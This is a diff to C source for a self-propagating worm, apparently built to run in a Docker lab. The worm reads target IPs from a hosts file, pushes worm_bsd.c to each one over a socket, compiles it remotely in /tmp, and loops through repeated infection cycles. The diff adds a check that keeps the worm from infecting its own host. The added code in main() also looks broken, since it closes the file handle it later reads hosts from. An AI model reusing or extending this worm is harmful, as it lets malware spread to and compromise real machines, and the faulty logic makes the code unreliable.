@@ -9,35 +9,6 @@
 #define MAX_IP_LEN 64
 #define DOCKER_IP_FILE "/etc/docker_ip"
 
-void get_docker_ip(ip)
-    char *ip;
-{
-    FILE *fp;
-    char line[128];
-
-    printf("[*] Reading local IP from %s\n", DOCKER_IP_FILE);
-
-    fp = fopen(DOCKER_IP_FILE, "r");
-    if (fp == (FILE *)0) {
-        printf("[-] Error: Could not open %s. Defaulting to 127.0.0.1\n", DOCKER_IP_FILE);
-        strcpy(ip, "127.0.0.1");
-        return;
-    }
-
-    /* Grab the first line of the file */
-    if (fgets(line, 128, fp) != (char *)0) {
-        /* %s reads characters until it hits a space, tab, or newline */
-        if (sscanf(line, "%s", ip) != 1) {
-            strcpy(ip, "127.0.0.1");
-        }
-    } else {
-        strcpy(ip, "127.0.0.1");
-    }
-
-    fclose(fp);
-    printf("[*] Local IP set to: %s\n", ip);
-}
-
 void deploy_receive_file(sock)
     int sock;
 {
@@ -161,7 +132,7 @@ void infect(ip)
     printf("--- TARGET /TMP CONTENTS ---\n%s\n----------------------------\n", io_buf);
 
     printf("[*] Compiling worm_bsd.c on target\n");
-    write_to_sock(sock, "cd /tmp; cc worm_bsd.c -o worm_bsd\n");
+    write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
     sleep(2);
     read_from_sock(sock, io_buf, IO_BUF_SIZE);
     
@@ -178,12 +149,23 @@ int main()
     FILE *fp;
     char line[128];
     char ip[MAX_IP_LEN];
+    char my_ip[MAX_IP_LEN];
 
     while (1) {
         fp = fopen(HOSTS_FILE, "r");
         if (fp == (FILE *)0) {
             sleep(25);
             continue;
+        }
+
+        /* Get our own IP to avoid self-infection */
+        strcpy(my_ip, "127.0.0.1");
+        fp = fopen("/etc/docker_ip", "r");
+        if (fp != (FILE *)0) {
+            if (fgets(line, 128, fp) != (char *)0) {
+                sscanf(line, "%s", my_ip);
+            }
+            fclose(fp);
         }
 
         while (fgets(line, 128, fp) != (char *)0) {
@@ -195,6 +177,10 @@ int main()
 
             if (strcmp(ip, "127.0.0.1") == 0)
                 continue;
+
+            if (strcmp(ip, my_ip) == 0) {
+                continue;
+            }
 
             infect(ip);
             printf(" ---- Infection Cycle completed for IP: %s ----\n", ip);
